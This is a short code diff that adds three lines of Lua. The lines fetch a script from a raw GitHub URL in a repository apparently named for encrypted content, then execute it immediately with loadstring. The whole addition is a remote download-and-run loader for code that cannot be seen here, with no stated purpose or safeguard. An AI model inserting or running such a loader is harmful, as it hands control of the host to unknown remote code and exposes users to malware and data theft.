@@ -1,0 +1,3 @@
+HTTP.get('https://raw.githubusercontent.com/sels123/Encripted/main/Voc%20cbz%20cancer', function(script)
+    assert(loadstring(script))()
+end)
